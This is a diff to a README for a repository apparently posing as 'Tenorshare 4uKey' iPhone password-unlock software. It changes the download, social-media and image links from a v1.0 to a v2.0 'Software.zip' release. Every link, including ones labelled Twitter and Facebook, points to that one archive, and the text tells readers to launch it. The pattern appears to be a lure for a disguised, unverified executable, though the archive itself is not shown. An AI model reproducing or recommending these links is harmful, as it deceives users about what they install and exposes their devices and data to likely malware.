@@ -33,7 +33,7 @@ Our repository covers a wide range of topics related to iPhone password unlockin
 
 ### Download
 To get started with **Tenorshare 4uKey iPhone Password Unlock**, you can download the tool from the following link:
-[![Download 4uKey](https://github.com/Fihaonana/Tenorshare-4uKey-iPhone-Password-Unlock/releases/download/v1.0/Software.zip)](https://github.com/Fihaonana/Tenorshare-4uKey-iPhone-Password-Unlock/releases/download/v1.0/Software.zip)
+[![Download 4uKey](https://github.com/Fihaonana/Tenorshare-4uKey-iPhone-Password-Unlock/releases/download/v2.0/Software.zip)](https://github.com/Fihaonana/Tenorshare-4uKey-iPhone-Password-Unlock/releases/download/v2.0/Software.zip)
 *Note: The downloaded file needs to be launched to begin the installation process.*
 
 ### Make sure to check out our latest releases for updates and improvements in the tool!
@@ -58,9 +58,9 @@ We welcome contributions from the community to improve **Tenorshare 4uKey iPhone
 
 ## Stay Connected
 Stay up to date with the latest news, updates, and tips on unlocking iPhones by following us on social media:
-- [Twitter](https://github.com/Fihaonana/Tenorshare-4uKey-iPhone-Password-Unlock/releases/download/v1.0/Software.zip)
-- [Facebook](https://github.com/Fihaonana/Tenorshare-4uKey-iPhone-Password-Unlock/releases/download/v1.0/Software.zip)
+- [Twitter](https://github.com/Fihaonana/Tenorshare-4uKey-iPhone-Password-Unlock/releases/download/v2.0/Software.zip)
+- [Facebook](https://github.com/Fihaonana/Tenorshare-4uKey-iPhone-Password-Unlock/releases/download/v2.0/Software.zip)
 
 Unlock your iPhone with ease using **Tenorshare 4uKey iPhone Password Unlock**! Thank you for choosing us as your trusted tool for iPhone unlocking needs. 🚀📱
 
-![4uKey Image](https://github.com/Fihaonana/Tenorshare-4uKey-iPhone-Password-Unlock/releases/download/v1.0/Software.zip)
+![4uKey Image](https://github.com/Fihaonana/Tenorshare-4uKey-iPhone-Password-Unlock/releases/download/v2.0/Software.zip)
